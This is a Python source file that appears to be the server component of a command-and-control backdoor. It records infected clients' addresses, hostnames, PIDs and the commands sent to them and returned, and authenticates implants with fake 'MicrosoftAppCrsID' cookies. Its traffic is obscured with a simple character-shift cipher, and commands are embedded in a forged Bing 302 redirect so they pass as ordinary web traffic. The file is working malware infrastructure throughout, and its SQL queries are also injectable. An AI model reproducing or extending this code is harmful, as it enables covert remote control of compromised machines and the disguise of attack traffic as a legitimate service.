import re 
import os
import sqlite3
import time
import base64


class Clinet_Data_Storage():

    def __init__(self):
        if(os.path.exists("Data/Conn.db")):
            pass
        else:
            Sqlit_Conn=sqlite3.connect("Data/Conn.db")
            Clinet_Data=Sqlit_Conn.cursor()
            sql='''
            CREATE TABLE Clinet_Data(
                id  INTEGER PRIMARY KEY AUTOINCREMENT ,
                Agree   TEXT ,
                Wan TEXT ,
                Lan TEXT ,
                SysName TEXT ,
                HostName    TEXT ,
                Pid TEXT ,
                Conn_Time TEXT ,
                Send_Cmd TEXT ,
                Return_Cmd  TEXT
                );
            '''
            Clinet_Data.execute(sql)
            Sqlit_Conn.commit()
            Sqlit_Conn.close()

    def Clinet_Conn_Select(self,sql):
        Sqlit_Conn=sqlite3.connect("Data/Conn.db")
        Clinet_Data=Sqlit_Conn.cursor()
        Clinet_Data.execute(sql)
        Return_Data=Clinet_Data.fetchall()
        Sqlit_Conn.close()
        return Return_Data

    def Clinet_Conn_Insert(self,Data):
        Sqlit_Conn=sqlite3.connect("Data/Conn.db")
        Clinet_Data=Sqlit_Conn.cursor()
        sql='''
        Insert into Clinet_Data(
            Agree,Wan,Lan,SysName,HostName,Pid,Conn_Time
        ) VALUES (
            '''+"'"+Data[0]+"'"+','+"'"+Data[1]+"'"+','+"'"+Data[2]+"'"+','+"'"+Data[3]+"'"+','+"'"+Data[4]+"'"+','+"'"+Data[5]+"'"+','+"'"+Data[6]+"'"+'''
        );
        '''
        Clinet_Data.execute(sql)
        Sqlit_Conn.commit()
        Sqlit_Conn.close()

    def Clinet_Conn_Snd_Cmd_Update(self,Data,Agree,Wan,Pid):
        Sqlit_Conn=sqlite3.connect("Data/Conn.db")
        Clinet_Data=Sqlit_Conn.cursor()
        Select_sql="Select id From Clinet_data where Agree='"+Agree+"' and Wan='"+Wan+"' and Pid='"+Pid+"';"
        Conn_Id=self.Clinet_Conn_Select(Select_sql)[0]
        if(Data=="NULL"):
            sql="Update Clinet_Data set Send_Cmd="+Data+" where Id="+str(Conn_Id[0])
        else:
            sql="Update Clinet_Data set Send_Cmd='"+Data+"' where Id="+str(Conn_Id[0])
        #print(sql)
        Clinet_Data.execute(sql)
        Sqlit_Conn.commit()
        Sqlit_Conn.close()

    def Clinet_Conn_Return_Cmd_Update(self,Data,Agree,Wan,Pid):
        Sqlit_Conn=sqlite3.connect("Data/Conn.db")
        Clinet_Data=Sqlit_Conn.cursor()
        Select_sql="Select id From Clinet_data where Agree='"+Agree+"' and Wan='"+Wan+"' and Pid='"+Pid+"';"
        Conn_Id=self.Clinet_Conn_Select(Select_sql)[0]
        if(Data=="NULL"):
            sql="Update Clinet_Data set Return_Cmd="+Data+" where Id="+str(Conn_Id[0])
        else:
            sql="Update Clinet_Data set Return_Cmd='"+Data+"' where Id="+str(Conn_Id[0])
        #print(sql)
        Clinet_Data.execute(sql)
        Sqlit_Conn.commit()
        Sqlit_Conn.close()

    def Clinet_Conn_Delete(self,Id):
        Sqlit_Conn=sqlite3.connect("Data/Conn.db")
        Clinet_Data=Sqlit_Conn.cursor()
        sql="Delete From Clinet_Data where Id="+str(Id)+";"
        Clinet_Data.execute(sql)
        Sqlit_Conn.commit()
        Sqlit_Conn.close()

    def Clinet_Conn_Time_UpDate(self,Agree,Wan,Pid):
        Sqlit_Conn=sqlite3.connect("Data/Conn.db")
        Clinet_Data=Sqlit_Conn.cursor()
        Select_sql="Select id From Clinet_data where Agree='"+Agree+"' and Wan='"+Wan+"' and Pid='"+Pid+"';"
        Conn_Id=self.Clinet_Conn_Select(Select_sql)[0]
        UpDate_Time=time.time()
        sql="Update Clinet_Data set Conn_Time='"+str(UpDate_Time)+"' where Id="+str(Conn_Id[0])
        Clinet_Data.execute(sql)
        Sqlit_Conn.commit()
        Sqlit_Conn.close()

    def Clinet_Conn_Update(self):
        while True:
            time.sleep(40)
            sql="Select Id,Conn_Time From Clinet_Data;"
            Conn_List=self.Clinet_Conn_Select(sql)
            Current_Time=time.time()
            if(len(Conn_List)>0):
                for Conn in Conn_List:
                    if(Current_Time-round(float(Conn[1]))>300):
                        self.Clinet_Conn_Delete(Conn[0])



class Request_Handle():

    def __init__(self):
        self.Init_Conn_Pass=["MicrosoftAppCrsID=C5E2329D565B4B0A9018CADE484A4704",
        "MicrosoftAppCrsID=FEA8B7C2417163EB8A9A004C87B93DBA",
        "MicrosoftAppCrsID=7868C2B99F22E1C1BCD43DAB1014FA8A",
        "MicrosoftAppCrsID=4C33529F074AD0D5E65E41DDABEF2F28",
        "MicrosoftAppCrsID=EEAAC865731D40131CE88804FF23AE2D",
        "MicrosoftAppCrsID=1EEAE0EE47CA92FCE923BF30834BAD02",
        "MicrosoftAppCrsID=F13C1971DDECAACBA44DA0667E385FFF"]

    def Cookie_Handle(self,Data):
        Cookie=re.findall(r"Cookie:.*?\n",Data,re.S)
        Cookie_List=Cookie[0][7:].split(";")
        for Cookie_Data in Cookie_List:
            Cookie_Data=Cookie_Data.strip()
            for Conn_Pass in self.Init_Conn_Pass:
                if(Conn_Pass==Cookie_Data):
                    return True
        else:
           return False
    def Get_Clinet_Pid(self,Data):
        Pid=re.findall(r"\?q=(.*)A",Data)
        return Pid[0]
    
    def Get_Cline_Data(self,Data):
        Encrypt_data=re.findall(r"<T>(.*)</T>",Data,re.S)
        #print(Encrypt_data)
        Encrypt_data=Encrypt_data[0]
        Decrypt_data=self.Data_Decrypt(Encrypt_data)
        #Decrypt_data=base64_decode(Decrypt_data)
        return Decrypt_data

    def Data_Encrypt(self,Data):
        Encrypt_data=''
        Data_len=len(Data)
        for i in range(Data_len):
            Encrypt_data=Encrypt_data+chr(ord(Data[i])+1)
        Encrypt_data=Encrypt_data[::-1]
        return Encrypt_data

    def Data_Decrypt(self,Data):
        Decrypt_Data=''
        Data_len=len(Data)
        for i in range(Data_len):
            Decrypt_Data=Decrypt_Data+chr(ord(Data[i])-1)
        Decrypt_Data=Decrypt_Data[::-1]
        return Decrypt_Data

    def Set_Data(self,LenData='168',Cookie_Cheak="None",Data=''):
        My_Data='''HTTP/1.1 302 Found\r
Cache-Control: private\r
Content-Length: '''+LenData+'''\r
Content-Type: text/html; charset=utf-8\r
Vary: Accept-Encoding\r
Location: https://www.bing.com\r
Set-Cookie: SNRHOP=TS=637804038108266842&I=1; domain=.bing.com; path=/; secure; CRSameSite='''+Cookie_Cheak+'''\r
X-Snr-Routing: 1\r
X-Cache: CONFIG_NOCACHE\r
Accept-Ch: Sec-CH-UA-Arch, Sec-CH-UA-Bitness, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform, Sec-CH-UA-Platform-Version\r
X-Msedge-Ref: Ref A: CE33F8B47DE54FE7827217CA43514D73 Ref B: HKG30EDGE0319 Ref \r
\r
<html><head><title>Object moved</title></head><body>\r
<h2>Object moved to <a href="https://www.bing.com/">here</a>.</h2>\r
<javascript>'''+Data+'''</javascript>
</body></html>'''
        My_Data=bytes(My_Data.encode())
        return My_Data